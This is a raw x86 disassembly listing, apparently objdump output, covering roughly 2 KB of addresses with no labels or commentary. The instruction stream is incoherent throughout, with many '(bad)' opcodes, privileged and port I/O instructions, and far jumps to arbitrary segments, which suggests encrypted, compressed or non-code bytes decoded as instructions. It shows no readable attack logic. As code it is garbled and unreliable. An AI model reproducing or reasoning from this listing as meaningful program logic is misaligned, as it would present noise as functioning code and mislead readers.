  408703:	mov    esi,0x64cadf5d
  408708:	ror    DWORD PTR [edx-0x41],cl
  40870b:	jle    0x4086e8
  40870d:	mov    esp,0x3eb82698
  408712:	out    dx,al
  408713:	and    esi,DWORD PTR [ebx-0x27c95485]
  408719:	push   ecx
  40871a:	retf   
  40871b:	daa    
  40871c:	inc    ebp
  40871d:	xor    ch,BYTE PTR [edi+0x24]
  408720:	jns    0x408735
  408722:	div    BYTE PTR [edi-0x40]
  408725:	inc    edi
  408726:	push   cs
  408727:	fistp  DWORD PTR [esi]
  408729:	dec    ecx
  40872a:	push   cs
  40872b:	loop   0x40878d
  40872d:	adc    DWORD PTR [ebx],edx
  40872f:	(bad)  
  408730:	je     0x4086e5
  408732:	pop    ss
  408733:	out    0xe1,al
  408735:	jo     0x4086e2
  408737:	cld    
  408738:	dec    ebp
  408739:	inc    edi
  40873a:	arpl   di,ax
  40873c:	lock inc ecx
  40873e:	adc    BYTE PTR [eax+0x2001f20],al
  408744:	mov    ah,0x2c
  408746:	sub    eax,0x1f1e3c39
  40874b:	out    0xb6,al
  40874d:	std    
  40874e:	cmc    
  40874f:	cmp    BYTE PTR ss:[ebx+edi*8-0x59a34491],0xf6
  408758:	xor    BYTE PTR [esi+edi*8+0x1acdca79],dh
  40875f:	xchg   ebp,eax
  408760:	xchg   edi,eax
  408761:	icebp  
  408762:	sbb    ecx,edi
  408764:	sti    
  408765:	inc    ecx
  408766:	xchg   edi,eax
  408767:	fst    DWORD PTR [edx-0x6d6361ec]
  40876d:	nop
  40876e:	test   BYTE PTR ds:0x6e6ca7d0,bl
  408774:	popf   
  408775:	iret   
  408776:	int3   
  408777:	sbb    DWORD PTR [ebp+0x771a4197],0x4e6ebe2d
  408781:	fcom   QWORD PTR [edx-0x4b80af23]
  408787:	call   0xceff:0xe99b949b
  40878e:	xchg   ecx,eax
  40878f:	ins    DWORD PTR es:[edi],dx
  408790:	or     BYTE PTR [edi],ah
  408792:	mov    es,WORD PTR [edx]
  408794:	aas    
  408795:	repnz shr ah,cl
  408798:	into   
  408799:	mov    ebx,0xdd53fcd3
  40879e:	push   esp
  40879f:	lock ins DWORD PTR es:[edi],dx
  4087a1:	pop    esp
  4087a2:	mov    ebx,0x2c84f397
  4087a7:	push   eax
  4087a8:	icebp  
  4087a9:	cmp    BYTE PTR [eax+0x7d36289e],dh
  4087af:	(bad)  
  4087b0:	mov    ds:0x963c9dd7,al
  4087b5:	jno    0x40875d
  4087b7:	pop    esi
  4087b8:	fwait
  4087b9:	pop    esi
  4087ba:	scas   al,BYTE PTR es:[edi]
  4087bb:	(bad)  
  4087bc:	int3   
  4087bd:	sbb    ebx,DWORD PTR [eax+eiz*2-0x3763266b]
  4087c4:	or     DWORD PTR [edx+0x4d],0xe01d795b
  4087cb:	mov    ds:0x912b2348,al
  4087d0:	or     BYTE PTR [ebx-0x2c0a11da],bl
  4087d6:	xor    eax,0x8c409d1b
  4087db:	out    0xdf,al
  4087dd:	(bad)  
  4087de:	sbb    al,0x57
  4087e0:	dec    esi
  4087e1:	cmp    eax,0xf9f67836
  4087e6:	lea    edx,[ecx]
  4087e8:	jnp    0x408853
  4087ea:	sar    BYTE PTR [edi+0x5d],0x4f
  4087ee:	cli    
  4087ef:	(bad)  
  4087f0:	in     al,dx
  4087f1:	pushf  
  4087f2:	mov    ebx,0x54e345cc
  4087f7:	int3   
  4087f8:	rcl    BYTE PTR [eax+0x337137bb],cl
  4087fe:	sbb    eax,0x4bebe674
  408803:	call   0x97ba:0xc2da1742
  40880a:	(bad)  
  40880b:	imul   BYTE PTR [ecx-0x29]
  40880e:	arpl   ax,ax
  408810:	sar    BYTE PTR ds:0x821dad48,0x55
  408817:	dec    esi
  408818:	test   eax,0xc2a833e2
  40881d:	fisttp QWORD PTR [ebx+edi*8]
  408820:	add    al,0xee
  408822:	mov    cl,0x16
  408824:	dec    esp
  408825:	and    al,0x3d
  408827:	xchg   esp,eax
  408828:	xor    al,0x5a
  40882a:	fs pop esp
  40882c:	hlt    
  40882d:	popa   
  40882e:	mov    esi,0x58ff0e26
  408833:	nop
  408834:	loope  0x40886f
  408836:	fcom   QWORD PTR [ebp+0x54cf1bad]
  40883c:	xor    eax,0x9ed887fc
  408841:	inc    edi
  408842:	sbb    esp,DWORD PTR [ebx-0x5e2fe6d3]
  408848:	in     eax,dx
  408849:	ins    DWORD PTR es:[edi],dx
  40884a:	pop    eax
  40884b:	push   ebp
  40884c:	retf   
  40884d:	jne    0x408809
  40884f:	adc    bl,BYTE PTR [ecx+0x4a287692]
  408855:	and    ecx,edx
  408857:	stos   BYTE PTR es:[edi],al
  408858:	pop    esp
  408859:	ror    BYTE PTR [ecx],0x2
  40885c:	loopne 0x408802
  40885e:	pop    ss
  40885f:	xchg   edx,eax
  408860:	fsubrp st(3),st
  408862:	cmp    al,0x25
  408864:	dec    esp
  408865:	push   esi
  408866:	xor    DWORD PTR [ecx+0x37801002],0xffffffde
  40886d:	push   0x703c4b32
  408872:	shl    DWORD PTR [di+0x68],cl
  408876:	dec    ebp
  408877:	pop    edx
  408878:	cmp    edx,DWORD PTR [ecx+esi*2-0x23]
  40887c:	sub    DWORD PTR [ecx-0x4a],esi
  40887f:	lods   eax,DWORD PTR ds:[esi]
  408880:	scas   eax,DWORD PTR es:[edi]
  408881:	ror    BYTE PTR [ebp+0x320f8b4],cl
  408887:	mov    dh,BYTE PTR [ecx+0x44]
  40888a:	sbb    eax,0xa376e3b3
  40888f:	or     eax,0xd781fa9b
  408894:	or     DWORD PTR [ecx+0x58],ecx
  408897:	add    al,0xd2
  408899:	int3   
  40889a:	pop    edx
  40889b:	(bad)  
  40889c:	adc    BYTE PTR [eax-0x31cb9c29],cl
  4088a2:	or     ah,cl
  4088a4:	sahf   
  4088a5:	sub    ebx,DWORD PTR [esp+esi*8-0x31]
  4088a9:	(bad)  
  4088aa:	(bad)  
  4088ab:	or     bh,BYTE PTR [edx-0x3b]
  4088ae:	mov    bh,0x8a
  4088b0:	sbb    eax,0xcda2c903
  4088b5:	fwait
  4088b6:	js     0x408854
  4088b8:	push   DWORD PTR [eax]
  4088ba:	enter  0xaf1a,0x50
  4088be:	iret   
  4088bf:	enter  0x1fb5,0x7
  4088c3:	jecxz  0x4088b9
  4088c5:	fwait
  4088c6:	enter  0xd556,0x4a
  4088ca:	add    esp,esi
  4088cc:	mov    cl,0xe1
  4088ce:	rol    BYTE PTR [eax+0x13297c57],cl
  4088d4:	xor    al,0x84
  4088d6:	dec    ebx
  4088d7:	or     ecx,DWORD PTR [ebp+0x3a]
  4088da:	in     al,dx
  4088db:	xchg   ebp,eax
  4088dc:	sahf   
  4088dd:	test   DWORD PTR [edi+0xf],0x6c9ac56f
  4088e4:	out    dx,eax
  4088e5:	xchg   ebx,eax
  4088e6:	test   eax,0x4b3ed3f1
  4088eb:	pushf  
  4088ec:	xchg   esi,eax
  4088ed:	xchg   esp,eax
  4088ee:	add    al,dl
  4088f0:	jno    0x408917
  4088f2:	push   ebx
  4088f3:	ret    
  4088f4:	mov    DWORD PTR [esi+0x52],0x3cde7cdc
  4088fb:	sahf   
  4088fc:	(bad)  
  4088fd:	ficomp WORD PTR [edi-0x18d428aa]
  408903:	nop
  408904:	fprem1 
  408906:	add    DWORD PTR [ebx+0x2661d046],edi
  40890c:	stos   BYTE PTR es:[edi],al
  40890d:	pop    esi
  40890e:	mov    ecx,0x4394b000
  408913:	retf   
  408914:	bound  ecx,QWORD PTR [esi-0x78]
  408917:	out    dx,al
  408918:	mov    edx,edi
  40891a:	daa    
  40891b:	add    DWORD PTR [esi],ecx
  40891d:	ret    
  40891e:	or     edx,DWORD PTR [esi]
  408920:	shr    BYTE PTR [ecx-0xb],1
  408923:	nop
  408924:	ds pop ds
  408926:	jg     0x4088dd
  408928:	cmp    eax,0xfc778784
  40892d:	dec    edx
  40892e:	inc    ecx
  40892f:	adc    DWORD PTR [eax-0x25],ebx
  408932:	push   0xfffffffb
  408934:	sbb    DWORD PTR [esi+0x75806864],esi
  40893a:	mov    al,0x66
  40893c:	(bad)  
  40893d:	mov    ds:0xaa9ae6f8,al
  408942:	leave  
  408943:	xor    bl,BYTE PTR [ecx+0x6f]
  408946:	imul   edi,DWORD PTR [ebp+0x1f62501d],0xffffffda
  40894d:	mov    cl,0x29
  40894f:	enter  0x86da,0x67
  408953:	and    eax,0x24d86004
  408958:	repz adc DWORD PTR [edx+0x4a],ebx
  40895c:	pusha  
  40895d:	cmp    BYTE PTR [edx+0x11],ah
  408960:	jge    0x408941
  408962:	inc    esi
  408963:	adc    ebp,esp
  408965:	ret    
  408966:	inc    edi
  408967:	inc    eax
  408968:	leave  
  408969:	stos   DWORD PTR es:[edi],eax
  40896a:	inc    ebx
  40896b:	scas   eax,DWORD PTR es:[edi]
  40896c:	int    0xb3
  40896e:	les    esp,FWORD PTR [ecx-0x3aabda9c]
  408974:	jmp    0xb2e0:0x682befa9
  40897b:	push   es
  40897c:	or     eax,0x9f4e3fc
  408981:	cmp    al,0xf
  408983:	ja     0x4089bd
  408985:	fild   DWORD PTR [ecx+0x33]
  408988:	cld    
  408989:	fldenv [ebx+0x40f1b59e]
  40898f:	push   ss
  408990:	rcl    DWORD PTR [edx+0x46],1
  408993:	(bad)  
  408994:	jbe    0x4089f6
  408996:	xor    BYTE PTR [esi],0xd9
  408999:	add    esi,ecx
  40899b:	push   0xb454825a
  4089a0:	pop    eax
  4089a1:	fs icebp 
  4089a3:	fs jge 0x408992
  4089a6:	inc    esp
  4089a7:	sbb    dh,ch
  4089a9:	and    al,0x7d
  4089ab:	mov    al,ah
  4089ad:	ds std 
  4089af:	pop    edi
  4089b0:	pcmpeqb mm5,QWORD PTR ds:0x44ae8219
  4089b7:	bound  ebp,QWORD PTR [eax-0x5c]
  4089ba:	jle    0x40896d
  4089bc:	mov    bl,0x3a
  4089be:	icebp  
  4089bf:	mov    eax,ds:0x4732c89e
  4089c4:	xor    al,0xac
  4089c6:	loop   0x408968
  4089c8:	and    esi,ebx
  4089ca:	es push esi
  4089cc:	push   ebp
  4089cd:	pop    es
  4089ce:	ss xchg ecx,eax
  4089d0:	jae    0x4089a6
  4089d2:	hlt    
  4089d3:	add    bl,0x76
  4089d6:	leave  
  4089d7:	nop
  4089d8:	jno    0x408a13
  4089da:	unpckhps xmm7,XMMWORD PTR [eax]
  4089dd:	enter  0xadb0,0xd5
  4089e1:	lods   eax,DWORD PTR ds:[esi]
  4089e2:	jne    0x4089da
  4089e4:	push   ebp
  4089e5:	mov    gs,WORD PTR [edx-0x6318df99]
  4089eb:	enter  0x9f5,0x64
  4089ef:	adc    al,BYTE PTR [edx]
  4089f1:	mov    ebp,0x44657386
  4089f6:	push   ebx
  4089f7:	inc    edx
  4089f8:	test   DWORD PTR [esi-0x381f3842],eax
  4089fe:	rol    DWORD PTR [edi-0x8485759],1
  408a04:	loope  0x4089fd
  408a06:	xor    BYTE PTR [eax-0x50],0x39
  408a0a:	or     al,0x14
  408a0c:	or     eax,0x6b27c9d1
  408a11:	neg    bl
  408a13:	int    0x12
  408a15:	pop    esi
  408a16:	inc    ebp
  408a17:	pop    ebx
  408a18:	or     al,0xc8
  408a1a:	jb     0x408a18
  408a1c:	les    edx,FWORD PTR [edx-0x79]
  408a1f:	dec    esp
  408a20:	inc    ebx
  408a21:	lock adc eax,0xeb804ef0
  408a27:	pop    ebp
  408a28:	jae    0x408a4f
  408a2a:	pop    eax
  408a2b:	in     eax,0xd1
  408a2d:	sbb    al,0xb5
  408a2f:	(bad)  
  408a30:	xchg   edx,eax
  408a31:	aas    
  408a32:	and    esi,eax
  408a34:	fst    DWORD PTR [ebp-0xb201983]
  408a3a:	jmp    0xdb26521b
  408a3f:	mov    edx,0x222c7fd1
  408a44:	repnz out dx,al
  408a46:	jmp    0x408aba
  408a48:	imul   dx,WORD PTR ds:0x976946db
  408a50:	rcr    DWORD PTR [ebx+0x15],1
  408a53:	xchg   edi,eax
  408a54:	fdivr  DWORD PTR [ebx+0x7b]
  408a57:	adc    edi,0xd0323954
  408a5d:	cmc    
  408a5e:	outs   dx,BYTE PTR ds:[esi]
  408a5f:	adc    al,0x24
  408a61:	mov    WORD PTR [eax-0x80],fs
  408a64:	not    BYTE PTR [ecx]
  408a66:	fdivr  st(4),st
  408a68:	inc    edi
  408a69:	jno    0x408a4c
  408a6b:	sub    ebx,edx
  408a6d:	mov    cl,0xb6
  408a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a70:	iret   
  408a71:	ja     0x408a53
  408a73:	jle    0x408ab5
  408a75:	out    dx,eax
  408a76:	mov    eax,0x461ccd16
  408a7b:	out    0x8d,al
  408a7d:	add    al,0xb4
  408a7f:	aas    
  408a80:	and    DWORD PTR [ebp-0x68732bfb],ecx
  408a86:	in     al,0xe3
  408a88:	add    DWORD PTR [ebp+0x478d658c],ecx
  408a8e:	daa    
  408a8f:	jne    0x408abd
  408a91:	dec    esi
  408a92:	jecxz  0x408a38
  408a94:	fiadd  WORD PTR [esp+eax*1-0x78d4e81c]
  408a9b:	mov    eax,0x1b4f277f
  408aa0:	fdivr  DWORD PTR [eax-0x5a41affc]
  408aa6:	jge    0x408a9e
  408aa8:	or     eax,0xdfd295bf
  408aad:	mov    esi,0xfc8f2a3c
  408ab2:	ins    DWORD PTR es:[edi],dx
  408ab3:	cmc    
  408ab4:	leave  
  408ab5:	push   ebp
  408ab6:	sbb    DWORD PTR [edx+edi*2-0x6a3ec103],ecx
  408abd:	test   DWORD PTR [ebx],0x39258f33
  408ac3:	das    
  408ac4:	adc    ebp,DWORD PTR [ebx-0x249ea770]
  408aca:	sbb    DWORD PTR [ecx],edx
  408acc:	(bad)
  408acf:	sub    eax,0x3a498756
  408ad4:	lea    edi,[edx-0x5c]
  408ad7:	dec    edi
  408ad8:	xchg   BYTE PTR [edx-0x51bc1bc8],ah
  408ade:	out    0x87,al
  408ae0:	dec    esp
  408ae1:	fidivr DWORD PTR [ebp+ebx*2+0x7d]
  408ae5:	dec    esp
  408ae6:	xor    al,0x1d
  408ae8:	ror    DWORD PTR [ebp-0x8898f08],0x65
  408aef:	dec    esp
  408af0:	sub    BYTE PTR [esi-0x44],bh
  408af3:	pop    esi
  408af4:	add    esp,DWORD PTR [ebx+0x3c]
  408af7:	cmp    eax,0x130ea000
  408afc:	add    esi,DWORD PTR [ebp+eax*1+0x3d253930]
  408b03:	dec    ebp
  408b04:	or     BYTE PTR [ecx-0xe],dh
  408b07:	call   0x1afa3bf7
  408b0c:	mov    WORD PTR [ebx],ss
  408b0e:	mov    DWORD PTR [ecx*4+0x5ebc9eb6],eax
  408b15:	clc    
  408b16:	arpl   WORD PTR ds:0x394978c6,ax
  408b1c:	aad    0x20
  408b1e:	add    ah,BYTE PTR [edx+0x3a]
  408b21:	aas    
  408b22:	jp     0x408b47
  408b24:	pop    ebp
  408b25:	loope  0x408b88
  408b27:	adc    edx,edi
  408b29:	jnp    0x408b5b
  408b2b:	push   edi
  408b2c:	add    BYTE PTR [ecx+0x6f2cf368],bl
  408b32:	and    DWORD PTR [ebx],esi
  408b34:	js     0x408b86
  408b36:	ret    
  408b37:	jg     0x408ad8
  408b39:	rol    DWORD PTR [ecx+0x67],1
  408b3c:	add    al,0x20
  408b3e:	and    ah,BYTE PTR [edx]
  408b40:	dec    ebp
  408b41:	and    eax,0x72f86a8f
  408b46:	iret   
  408b47:	imul   esp,DWORD PTR [edi+eax*1+0x43731967],0x98916f7e
  408b52:	adc    dl,BYTE PTR [ecx-0x4029bee7]
  408b58:	in     eax,0x96
  408b5a:	pop    ss
  408b5b:	or     edi,esp
  408b5d:	mov    BYTE PTR [esi],bh
  408b5f:	cmp    DWORD PTR [edx+0x9],eax
  408b62:	jne    0x408b3b
  408b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b65:	leave  
  408b66:	dec    eax
  408b67:	or     eax,0xf5c8f6f4
  408b6c:	leave  
  408b6d:	rol    edi,0x8a
  408b70:	sbb    DWORD PTR [ecx-0x46],ebp
  408b73:	xchg   esi,eax
  408b74:	aad    0x93
  408b76:	add    al,0x23
  408b78:	sub    ch,BYTE PTR [esi-0x64]
  408b7b:	in     al,dx
  408b7c:	push   ebx
  408b7d:	rcr    BYTE PTR [edi],0x9d
  408b80:	fistp  DWORD PTR [ebx+0x130b642]
  408b86:	outs   dx,BYTE PTR ds:[esi]
  408b87:	dec    edx
  408b88:	jnp    0x408b70
  408b8a:	dec    ebp
  408b8b:	adc    BYTE PTR [esi-0x75],bl
  408b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b8f:	into   
  408b90:	and    BYTE PTR [ebp+0x404e4643],ah
  408b96:	mov    edi,0xa4161016
  408b9b:	fwait
  408b9c:	push   esp
  408b9d:	bound  esp,QWORD PTR es:[ebp+0x56]
  408ba1:	aaa    
  408ba2:	fisubr DWORD PTR [ecx+0x25]
  408ba5:	loopne 0x408b93
  408ba7:	jl     0x408bc3
  408ba9:	test   al,0xd6
  408bab:	mov    bh,BYTE PTR [ebx+0x30]
  408bae:	repz push ebp
  408bb0:	mov    edx,0xab192e11
  408bb5:	pop    edi
  408bb6:	push   ebx
  408bb7:	(bad)  
  408bb8:	rcl    esi,1
  408bba:	mov    ecx,0xefaa0bf3
  408bbf:	sub    eax,0x4ae8c6f
  408bc4:	cmp    al,0x25
  408bc6:	xchg   esp,eax
  408bc7:	push   ebp
  408bc8:	jb     0x408c21
  408bca:	pop    ebp
  408bcb:	mov    ah,0x82
  408bcd:	pop    ss
  408bce:	cmp    BYTE PTR [eax],dl
  408bd0:	jbe    0x408b90
  408bd2:	je     0x408c1e
  408bd4:	repz mov esi,0x757ece3d
  408bda:	sti    
  408bdb:	fidiv  WORD PTR [edx+edi*2-0x41]
  408bdf:	xor    DWORD PTR [eax-0x15b1118f],eax
  408be5:	cmp    BYTE PTR [ecx+0x2],0x93
  408be9:	mov    eax,0x69f5bfd9
  408bee:	push   ds
  408bef:	xor    ebx,DWORD PTR [eax*1+0x6fac3bfa]
  408bf6:	in     eax,dx
  408bf7:	add    al,0xee
  408bf9:	iret   
  408bfa:	pop    esp
  408bfb:	sub    dl,BYTE PTR [edi+0x51]
  408bfe:	ins    DWORD PTR es:[edi],dx
  408bff:	sub    esp,DWORD PTR [ebp-0x23]
  408c02:	sbb    DWORD PTR [ebp+0x24],esp
  408c05:	sahf   
  408c06:	inc    ecx
  408c07:	xor    DWORD PTR [esi-0x8e170a7],ecx
  408c0d:	push   cs
  408c0e:	dec    eax
  408c0f:	mov    WORD PTR [ebx],fs
  408c11:	add    ecx,DWORD PTR [eax]
  408c13:	push   0x4e
  408c15:	pop    es
  408c16:	ss mov dl,0x59
  408c19:	pop    edi
  408c1a:	repz inc esi
  408c1c:	scas   eax,DWORD PTR es:[edi]
  408c1d:	inc    eax
  408c1e:	aas    
  408c1f:	out    dx,eax
  408c20:	jo     0x408c13
  408c22:	and    al,0x1a
  408c24:	mov    cl,0x2c
  408c26:	test   BYTE PTR [eax+esi*2],0xa
  408c2a:	shr    dl,0xb0
  408c2d:	add    DWORD PTR [ebp-0x772cca4],eax
  408c33:	pop    ebx
  408c34:	add    edx,DWORD PTR [ebx+0x46181f7b]
  408c3a:	push   cs
  408c3b:	es push es
  408c3d:	gs inc ecx
  408c3f:	xor    DWORD PTR [esi+ecx*2+0x41],esi
  408c43:	loope  0x408c19
  408c45:	xchg   edx,eax
  408c46:	add    BYTE PTR [esi],cl
  408c48:	jecxz  0x408cb0
  408c4a:	jle    0x408c13
  408c4c:	fs cli 
  408c4e:	data16 jl 0x408c2e
  408c51:	jg     0x408bf9
  408c53:	sub    eax,0xb1a9d549
  408c58:	inc    edx
  408c59:	push   ecx
  408c5a:	(bad)  
  408c5b:	cmc    
  408c5c:	jl     0x408c2d
  408c5e:	inc    ebp
  408c5f:	sbb    ecx,DWORD PTR [ebp-0x3f]
  408c62:	lock push esp
  408c64:	pushf  
  408c65:	das    
  408c66:	sbb    edx,edx
  408c68:	lods   eax,DWORD PTR ds:[esi]
  408c69:	push   ebp
  408c6a:	(bad)  
  408c6c:	fstp   DWORD PTR [esi+0x64d8ed26]
  408c72:	psubw  mm5,QWORD PTR [edi-0x6]
  408c76:	sub    BYTE PTR [eax+ecx*4-0x4244c1da],dl
  408c7d:	and    DWORD PTR [edx-0x790c3890],esi
  408c83:	add    bh,BYTE PTR [esi-0x27d552f6]
  408c89:	xor    DWORD PTR ds:[edi-0x60],eax
  408c8d:	or     edi,DWORD PTR [ebx+ebx*2+0x151e605c]
  408c94:	mov    edi,0x5123271d
  408c99:	inc    esi
  408c9a:	mov    ecx,0x7cda948f
  408c9f:	gs jmp 0x244c:0x19699b6f
  408ca7:	scas   al,BYTE PTR es:[edi]
  408ca8:	inc    eax
  408ca9:	mov    ecx,0x2ee4e9a
  408cae:	nop
  408caf:	fsub   DWORD PTR [ebp-0x21ba39ae]
  408cb5:	xchg   esp,eax
  408cb6:	add    DWORD PTR [ecx+0x1deaaaf4],ebx
  408cbc:	and    ebp,DWORD PTR [edx]
  408cbe:	fcmovbe st,st(7)
  408cc0:	xchg   ecx,eax
  408cc1:	sub    bh,bh
  408cc3:	push   0xa445f4c6
  408cc8:	lods   eax,DWORD PTR ds:[esi]
  408cc9:	fs jnp 0x408d3e
  408ccc:	ret    
  408ccd:	jno    0x408c71
  408ccf:	mov    edx,0xa43df39e
  408cd4:	test   BYTE PTR [eax-0xd],ah
  408cd7:	test   al,0xb4
  408cd9:	aam    0x4a
  408cdb:	call   0x519:0x91b04bee
  408ce2:	jl     0x408c68
  408ce4:	repz inc ebx
  408ce6:	jmp    0xdac0:0x24ea4ab6
  408ced:	fwait
  408cee:	popf   
  408cef:	jl     0x408cbd
  408cf1:	lea    ecx,[edi]
  408cf3:	cwde   
  408cf4:	sub    al,0x84
  408cf6:	xor    BYTE PTR [ecx+edx*8-0x4c9357b8],ch
  408cfd:	imul   esp,DWORD PTR [esi-0x3e95aaf3],0x4b
  408d04:	adc    al,0x39
  408d06:	in     eax,0x5b
  408d08:	and    al,0x9b
  408d0a:	mov    bl,0x1
  408d0c:	add    DWORD PTR [ebx],0x6182b594
  408d12:	enter  0xe3ee,0x73
  408d16:	ret    
  408d17:	loope  0x408d97
  408d19:	mov    ch,0xf9
  408d1b:	icebp  
  408d1c:	cmp    ebx,eax
  408d1e:	jne    0x408cfe
  408d20:	imul   edi,DWORD PTR [esi+edx*1+0x2d8c1d63],0xf896a15
  408d2b:	dec    ebx
  408d2c:	int3   
  408d2d:	inc    esi
  408d2e:	or     ebp,DWORD PTR [ecx-0xc]
  408d31:	push   ebx
  408d32:	or     al,0x53
  408d34:	mov    al,ah
  408d36:	scas   eax,DWORD PTR es:[edi]
  408d37:	aas    
  408d38:	push   eax
  408d39:	sub    DWORD PTR [ebx-0x32],edi
  408d3c:	fidivr DWORD PTR [edi+0x7c1223b0]
  408d42:	mov    BYTE PTR [edi+0x3bd0e86d],ah
  408d48:	inc    edi
  408d49:	nop
  408d4a:	push   esi
  408d4b:	in     al,dx
  408d4c:	ja     0x408dbb
  408d4e:	xchg   ecx,eax
  408d4f:	iret   
  408d50:	mov    ah,0x8b
  408d52:	and    eax,0x6c8f42a2
  408d57:	scas   al,BYTE PTR es:[edi]
  408d58:	(bad)  
  408d59:	in     al,0xe9
  408d5b:	mov    edx,0xe78ca207
  408d60:	dec    esp
  408d61:	jmp    0x1b293fb2
  408d66:	push   ss
  408d67:	in     eax,0x4b
  408d69:	in     eax,0xbd
  408d6b:	push   edx
  408d6c:	pop    esi
  408d6d:	mov    al,0xd3
  408d6f:	mov    ecx,0x252827b0
  408d74:	stos   DWORD PTR es:[edi],eax
  408d75:	mov    bl,BYTE PTR [ebp+0x53]
  408d78:	jbe    0x408df3
  408d7a:	xchg   esp,eax
  408d7b:	push   ss
  408d7c:	and    eax,0xbab94816
  408d81:	aaa    
  408d82:	push   eax
  408d83:	nop
  408d84:	imul   DWORD PTR [ebp+0x79]
  408d87:	xchg   esp,eax
  408d88:	push   es
  408d89:	int    0xfd
  408d8b:	lods   al,BYTE PTR ds:[esi]
  408d8c:	mov    esp,0x341107c6
  408d91:	jle    0x408e04
  408d93:	loop   0x408dff
  408d95:	pop    ecx
  408d96:	adc    BYTE PTR [ebx],0x1b
  408d99:	scas   eax,DWORD PTR es:[edi]
  408d9a:	pop    esp
  408d9b:	(bad)  
  408d9c:	mov    ss,WORD PTR ds:0xf8086756
  408da2:	jb     0x408d62
  408da4:	rdtsc  
  408da6:	fidiv  WORD PTR [esi]
  408da8:	sub    edi,DWORD PTR [edi]
  408daa:	ficomp DWORD PTR ds:0xaca169c6
  408db0:	(bad)  [edx+ebx*2]
  408db3:	xchg   edi,eax
  408db4:	das    
  408db5:	retf   0xb95b
  408db8:	and    al,0x6
  408dba:	stos   DWORD PTR es:[edi],eax
  408dbb:	pop    ds
  408dbc:	pshufw mm3,mm2,0xa0
  408dc0:	pop    ecx
  408dc1:	test   DWORD PTR [esi],ecx
  408dc3:	mov    ds:0xef381136,al
  408dc8:	mov    cl,0xf1
  408dca:	jl     0x408dec
  408dcc:	adc    ch,cl
  408dce:	adc    eax,DWORD PTR [ecx]
  408dd0:	or     dh,BYTE PTR [esi+edx*8-0x108395b1]
  408dd7:	push   ebx
  408dd8:	sbb    al,0x85
  408dda:	pop    eax
  408ddb:	loopne 0x408dc2
  408ddd:	in     al,dx
  408dde:	(bad)  
  408de0:	push   esi
  408de1:	push   es
  408de2:	xchg   esi,eax
  408de3:	mov    esi,0x9cbf4221
  408de8:	jle    0x408e4a
  408dea:	cmp    eax,0x85097587
  408def:	loopne 0x408da7
  408df1:	jp     0x408e6b
  408df3:	xchg   ecx,eax
  408df4:	inc    edx
  408df5:	jns    0x408e4c
  408df7:	mov    eax,ds:0xd82152d3
  408dfc:	jge    0x408e10
  408dfe:	jmp    0x5bca:0xc3d84df2
  408e05:	xor    cl,ah
  408e07:	out    dx,eax
  408e08:	sub    eax,0xe9d82791
  408e0d:	jle    0x408e89
  408e0f:	mov    eax,ds:0x53c95b4
  408e14:	add    DWORD PTR [ebp+0x0],ecx
  408e17:	lods   eax,DWORD PTR ds:[esi]
  408e18:	xor    al,0xb5
  408e1a:	adc    eax,0x823b242f
  408e1f:	leave  
  408e20:	sub    eax,0x3b23fcbe
  408e25:	sbb    esi,edx
  408e27:	scas   al,BYTE PTR es:[edi]
  408e28:	and    BYTE PTR [edi-0x19],bl
  408e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e2c:	mov    ds:0x4958582f,al
  408e31:	daa    
  408e32:	mov    BYTE PTR [edx-0x1],dh
  408e35:	(bad)  
  408e36:	and    DWORD PTR [edx-0x41],ebp
  408e39:	cld    
  408e3a:	mov    ah,0x1e
  408e3c:	mov    al,0x11
  408e3e:	or     esp,eax
  408e40:	adc    al,0x23
  408e42:	mov    ds:0xe70f4486,eax
  408e47:	addr16 mov al,ds:0x8f7d
  408e4b:	and    al,0xa0
  408e4d:	mov    bl,0x48
  408e4f:	ret    0xa84b
  408e52:	in     eax,0x47
  408e54:	inc    ebp
  408e55:	aad    0x67
  408e57:	imul   edx,esi,0x1c4b0a5a
  408e5d:	cmc    
  408e5e:	not    BYTE PTR [ebx+0x40]
  408e61:	das    
  408e62:	cld    
  408e63:	push   ebp
  408e64:	jb     0x408e16
  408e66:	loopne 0x408e77
  408e68:	or     BYTE PTR [edx],dh
  408e6a:	(bad)  
  408e6b:	mov    edi,0x4354786b
  408e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e71:	ja     0x408e42
  408e73:	sub    eax,0xdac4e185
  408e78:	ror    BYTE PTR [eax+ebp*2+0x105f0160],1
  408e7f:	icebp  
  408e80:	scas   al,BYTE PTR es:[edi]
  408e81:	mov    ah,0xf2
  408e83:	jmp    0x408e91
  408e85:	test   eax,0x939ee920
  408e8a:	cmp    DWORD PTR [ecx],eax
  408e8c:	in     al,dx
  408e8d:	push   ebx
  408e8e:	ds inc esp
  408e90:	cmp    eax,0xd1ab5a9
  408e95:	or     DWORD PTR [edx-0x406dd0f8],ecx
  408e9b:	sub    bl,0xae
  408e9e:	or     BYTE PTR [ecx+0x5fa14e25],bl
  408ea4:	aad    0xcf
  408ea6:	icebp  
  408ea7:	pop    ecx
  408ea8:	clc    
  408ea9:	or     dl,BYTE PTR [ecx+0x549161f2]
  408eaf:	dec    ecx
  408eb0:	jns    0x408f21
  408eb2:	(bad)  
  408eb3:	mov    eax,ds:0xbf8dbe95
  408eb9:	or     ah,ah
  408ebb:	mov    eax,ds:0x59df3437
  408ec0:	push   ebx
  408ec1:	mov    ah,0xe2
  408ec3:	repnz fnsave [edx]
  408ec6:	and    dl,BYTE PTR [ecx-0x50]
  408ec9:	inc    ecx
  408eca:	(bad)  
  408ecb:	add    bl,BYTE PTR [ebp+ebp*1-0x26180766]
  408ed2:	pop    eax
  408ed3:	pop    esp
  408ed4:	aaa    
  408ed5:	outs   dx,DWORD PTR ds:[esi]
  408ed6:	adc    DWORD PTR [eax+0x76],edi
  408ed9:	test   eax,0x8e5796c0
  408ede:	dec    eax
  408edf:	in     eax,0xf6
  408ee1:	and    ecx,DWORD PTR [ecx-0x14]
  408ee4:	idiv   DWORD PTR [bp+si]
  408ee7:	dec    esi
  408ee8:	sti    
  408ee9:	mov    WORD PTR ds:0xc97fd9da,cs
  408eef:	cmp    al,0x43
  408ef1:	add    ebx,esp
  408ef3:	or     eax,0x99014417
  408ef8:	sub    eax,0x8783ad0
  408efd:	pop    es
  408efe:	add    eax,0x9a6ed1fa
  408f03:	int    0xe4
  408f05:	jle    0x408f83
  408f07:	mov    al,0x36
  408f09:	cwde   
